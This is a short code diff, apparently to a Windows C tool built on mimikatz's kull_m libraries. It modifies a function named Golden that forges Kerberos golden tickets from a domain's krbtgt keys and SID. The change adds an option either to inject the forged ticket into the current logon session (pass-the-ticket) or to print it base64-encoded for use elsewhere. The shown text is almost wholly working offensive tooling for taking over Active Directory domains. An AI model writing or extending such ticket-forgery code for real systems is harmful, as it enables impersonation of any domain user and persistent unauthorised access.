@@ -2,7 +2,8 @@
 #include "kerb.h"
 
 #include "asn1/kull_m_asn1.h"
-
+#include "base64/base64.h"
+#include "lsa/lsa.h"
 #include <locale.h>
 #include <stdio.h>
 #include <windows.h>
@@ -198,7 +199,7 @@ void kull_m_string_displayLocalFileTime(IN PFILETIME pFileTime) {
 
 void Golden(const char *domain, const char *user, const char *rc4,
             const char *aes128, const char *aes256, const char *domainSID,
-            const char *spn) {
+            const char *spn, BOOL ptt) {
   printf("requesting golden ticket..\n");
   BYTE key[AES_256_KEY_LENGTH] = {0};
   DWORD keyType = 0, i, j, id = 500, nbGroups, nbSids = 0, rodc = 0;
@@ -276,6 +277,10 @@ void Golden(const char *domain, const char *user, const char *rc4,
       pCSystem->KeySize, keyType, pSid, netbiosDomain, id, groups, nbGroups,
       sids, nbSids, rodc, pClaimsSet);
 
-  wprintf(L"size of ticket: %u\n", BerApp_KrbCred->bv_val);
-  Ptt(BerApp_KrbCred->bv_val, BerApp_KrbCred->bv_len);
+  if (ptt == TRUE) {
+    Ptt(BerApp_KrbCred->bv_val, BerApp_KrbCred->bv_len);
+  } else {
+    printf("%s\n",
+           base64_encode(BerApp_KrbCred->bv_val, BerApp_KrbCred->bv_len));
+  }
 }
